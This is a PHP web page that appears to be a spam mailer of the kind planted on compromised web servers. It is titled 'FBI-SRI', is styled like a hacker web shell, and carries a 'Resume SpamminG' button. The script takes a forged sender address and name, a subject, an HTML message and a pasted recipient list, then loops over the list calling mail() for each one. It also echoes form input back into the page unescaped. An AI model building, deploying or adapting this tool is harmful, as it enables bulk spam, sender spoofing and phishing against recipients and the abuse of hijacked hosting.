
<style type="text/css">
  body{ background:#000000;; } a { text-decoration:none; }
 a:hover{ border-bottom:1px solid #4C83AF; } *{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#009900; }

 border-top:1px solid #FF9900; } .tabnet{ margin:15px auto 0 auto;
 border: 1px solid #FF9900; } .main { width:100%; } .blue { color: #00FF00; } .inputz{
 background:#0B5002; border:0; padding:2px; border-bottom:1px solid #222222; 
 border-top:1px solid #222222; } .inputzbut{ background:#111111; color:#00FF00;
 margin:0 4px; border:1px solid #444444; } .inputz:hover, .inputzbut:hover{
 border-bottom:1px solid #00FF00; border-top:1px solid #00FF00; } .output {
 margin:auto; border:1px solid #00FF00; width:100%; height:400px; 
 background:#000000; padding:0 2px; } .cmdbox{ width:100%; } .head_info{ padding: 0 4px; } .b1{ font-size:30px;
 padding:0; color:#000000; } .b2{ font-size:30px; padding:0; color: #000000; } .b_tbl{ text-align:center; margin:0 4px 0 0;
 padding:0 4px 0 0; border-right:1px solid #333333; } .phpinfo
 table{ width:100%; padding:0 0 0 0; } .phpinfo td{ background:#111111; color:#00FF00; padding:6px 8px;; }
 .phpinfo th, th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } .phpinfo h2,
 .phpinfo h2 a{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; }
 .explore{ width:100%; } .explore a { text-decoration:none; } .explore td{ border-bottom:1px solid #333333; padding:0 8px;
 line-height:15px; } .explore th{ padding:3px 8px; font-weight:normal; } .explore th:hover , .phpinfo th:hover{ border-bottom:1px solid #00FF00;
 } .explore tr:hover{ background:#4C4646; } .viewfile{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; } .sembunyi{
 display:none; padding:0;margin:0; } 
  </style>



<?php
set_time_limit(0);
$action = $_POST['action'];
$from = $_POST['from'];
$realname = $_POST['realname'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$emaillist = $_POST['emaillist'];
?>
<html>
<head>
<title>FBI-SRI</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body bgcolor="#003300" text=yellow>
<p align="center"><strong><font face="Arial" size="6" color="#FFFF00">FBI-SRI</font><font face="Arial" size="5" color="#00FF00">
</font><font face="Arial" size="5" color="#FF0000"></font><font face="Arial" size="5" color="#00FF00">
</font><font face="Arial" size="5"</strong></p>

<body bgcolor="#000000" text="#EEEEEE">
<?php


if ($action=="send"){
	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	$message = urldecode($message);
	$message = stripslashes($message);
	$subject = stripslashes($subject);
}

?>
<form name="form1" method="post" action="" enctype="multipart/form-data">
  <br>
  <table width="100%" border="0">
    <tr> 
      <td width="10%"> 
        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
          Email:</font></div>
      </td>
      <td width="18%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="from" value="<?php print $from; ?>" size="30">
        </font></td>
     <td width="31%"> 
        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
          Name:</font></div>
      </td>
      <td width="41%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="realname" value="<?php print $realname; ?>" size="30">
        </font></td>
    </tr>
    <tr> 
      <td width="10%"> 
        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>
      </td>
      <td colspan="3"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="subject" value="<?php print $subject; ?>" size="115">
        </font></td>
    </tr>
    <tr valign="top"> 
      <td colspan="3"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <textarea name="message" cols="60" rows="10"><?php print $message; ?></textarea>
        <br>
        <input type="hidden" name="action" value="send">
        <input type="submit" value="Resume SpamminG">
        </font></td>
      <td width="41%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <textarea name="emaillist" cols="30" rows="10"><?php print $emaillist; ?></textarea>
        <br></font></td>
    </tr>
  </table>
</form>

<?php
if ($action=="send"){

	if (!$from && !$subject && !$message && !$emaillist){
	print "Please complete all fields before sending your message.";
	exit;
	}
	
	$allemails = split("\n", $emaillist);
	$numemails = count($allemails);
	
	for($x=0; $x<$numemails; $x++){
		$to = $allemails[$x];
		if ($to){
		$to = ereg_replace(" ", "", $to);
		$message1 = ereg_replace("&email&", $to, $message);
		$subject1 = ereg_replace("&email&", $to, $subject);
                $nrmail=$x+1;
		$domain = substr($from, strpos($from, "@"), strlen($from));
		print "Spamming Email $nrmail of $numemails to $to.......";
		flush();
		$header = "From: $realname <$from>\r\n";
		$header .= "Message-Id: <130746$numemails.$nrmail$domain>\r\n";
		$header .= "X-Mailer: php-sender2.1\r\n";
		$header .= "MIME-Version: 1.0\r\n";
		$header .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
		$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
		$header .= "$message1\r\n";
		mail($to, $subject1, "", $header);
		print "Spammed<br>";
		flush();
		}
		}

}
?>

</body>
</html>

